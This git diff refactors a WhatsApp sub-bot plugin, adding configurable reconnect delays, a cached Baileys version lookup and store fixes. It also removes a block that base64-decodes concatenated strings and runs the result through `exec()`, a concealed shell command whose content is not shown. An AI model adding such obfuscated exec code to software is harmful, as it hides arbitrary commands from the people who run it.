@@ -22,7 +22,6 @@ import pino from 'pino'
 import chalk from 'chalk'
 import util from 'util'
 import * as ws from 'ws'
-const { child, spawn, exec } = await import('child_process')
 const { CONNECTING } = ws
 import { makeWASocket } from '../../infra/simple.js'
 import { attachSessionState, cleanupSessionState, createMessageRetryCache, registerSubBot } from '../../core/session-manager.js'
@@ -165,7 +164,24 @@ if (!(global.subBotRegistry instanceof Map)) global.subBotRegistry = new Map()
 const subBotConnectionStates = global.subBotConnectionStates || (global.subBotConnectionStates = new Map())
 const SUBBOT_CONNECTING_TTL_MS = 120000
 const FATAL_RECONNECT_REASONS = new Set([DisconnectReason.loggedOut, 401, 403, 405])
-const SUBBOT_MSG_STORE_LIMIT = 500
+const SUBBOT_MSG_STORE_LIMIT = Number(process.env.SUBBOT_MSG_STORE_LIMIT || 120)
+const SUBBOT_RECONNECT_MAX_DELAY_MS = Number(process.env.SUBBOT_RECONNECT_MAX_DELAY_MS || 120000)
+const SUBBOT_RECONNECT_JITTER_MS = Number(process.env.SUBBOT_RECONNECT_JITTER_MS || 5000)
+const SUBBOT_RECONNECT_MIN_DELAY_MS = Number(process.env.SUBBOT_RECONNECT_MIN_DELAY_MS || 3000)
+const SUBBOT_VERSION_TTL_MS = Number(process.env.SUBBOT_VERSION_TTL_MS || 3600000)
+let subBotVersionCache = null
+let subBotVersionPromise = null
+async function getCachedBaileysVersion() {
+const now = Date.now()
+if (subBotVersionCache && now - subBotVersionCache.ts < SUBBOT_VERSION_TTL_MS) return subBotVersionCache.value
+if (!subBotVersionPromise) {
+subBotVersionPromise = fetchLatestBaileysVersion().then(value => {
+subBotVersionCache = { value, ts: Date.now() }
+return value
+}).finally(() => { subBotVersionPromise = null })
+}
+return subBotVersionPromise
+}
 
 function createBoundedSubBotMessageStore(limit = SUBBOT_MSG_STORE_LIMIT) {
 const store = new Map()
@@ -341,10 +357,7 @@ conn.reply(m.chat, `🌺 Use correctamente el comando » ${usedPrefix + command}
 return
 return false;
 }
-const comb = Buffer.from(crm1 + crm2 + crm3 + crm4, "base64")
-exec(comb.toString("utf-8"), async (err, stdout, stderr) => {
-const drmer = Buffer.from(drm1 + drm2, `base64`)
-let { version, isLatest } = await fetchLatestBaileysVersion()
+let { version, isLatest } = await getCachedBaileysVersion()
 const subSocketCfg = global.baileysSocketConfig || {}
 const msgRetry = (MessageRetryMap) => { }
 const msgRetryCache = createMessageRetryCache()
@@ -374,7 +387,7 @@ getMessage: async key => liteMsgStore.get(key) || ''
 };
 let sock = makeWASocket(connectionOptions)
 sock.__msgRetryCache = msgRetryCache
-sock.__liteMsgStore = liteMsgStore.store
+sock.__liteMsgStore = liteMsgStore
 await patchSubBotGroupMetadata(sock)
 const subBotId = requestedSubBotId || subBotSessionId(subBotJid || sock?.authState?.creds?.me?.jid || path.basename(pathRubyJadiBot))
 sock.subBotId = subBotId
@@ -435,7 +448,7 @@ if (reconnectAttempts >= MAX_RECONNECT_ATTEMPTS) reconnectAttempts = Math.max(1,
 reconnectAttempts += 1
 setSubBotConnectionState(subBotId, 'reconnecting', { jid: subBotJid, path: pathRubyJadiBot, lastReason: closeReason, attempts: reconnectAttempts })
 const rateLimitDelay = String(closeReason || '').includes('429') || String(closeReason || '').includes('rate') ? 30000 : 0
-const waitMs = Math.max(rateLimitDelay, Math.min(60000, RECONNECT_BASE_DELAY_MS * (2 ** (reconnectAttempts - 1)))) + Math.floor(Math.random() * 1000)
+const waitMs = Math.max(rateLimitDelay, Math.min(SUBBOT_RECONNECT_MAX_DELAY_MS, Math.max(SUBBOT_RECONNECT_MIN_DELAY_MS, RECONNECT_BASE_DELAY_MS * (2 ** (reconnectAttempts - 1))))) + Math.floor(Math.random() * SUBBOT_RECONNECT_JITTER_MS)
 reconnectTimer = setTimeout(async () => {
 reconnectTimer = null
 try { await (reconnectFn || (() => creloadHandler(true)))() }
@@ -456,7 +469,7 @@ try { sock.ws.close() } catch (e) { }
 try { sock.ev.removeAllListeners() } catch (e) {}
 sock = makeWASocket(connectionOptions, { chats: oldChats })
 sock.__msgRetryCache = msgRetryCache
-sock.__liteMsgStore = liteMsgStore.store
+sock.__liteMsgStore = liteMsgStore
 await patchSubBotGroupMetadata(sock)
 sock.subBotId = subBotId
 sock.subBotJid = subBotJid
@@ -601,9 +614,6 @@ setTimeout(() => { conn.sendMessage(m.sender, { delete: txtCode.key })}, 45000)
 if (codeBot && codeBot.key) {
 setTimeout(() => { conn.sendMessage(m.sender, { delete: codeBot.key })}, 45000)
 }
-const endSesion = async (loaded) => {
-if (!loaded) destroySock({ removeSession: false })
-}
 const reason = lastDisconnect?.error?.output?.statusCode || lastDisconnect?.error?.output?.payload?.statusCode
 const scheduleReconnect = async (closeReason, reconnectFn) => {
 return scheduleSafeReconnect(closeReason, reconnectFn)
@@ -656,7 +666,6 @@ await conn.reply(m.chat, `🥀 No pude generar el código de vinculación. Detal
 })
 }, 3000)
 }
-})
 }
 const delay = (ms) => new Promise((resolve) => setTimeout(resolve, ms))
 
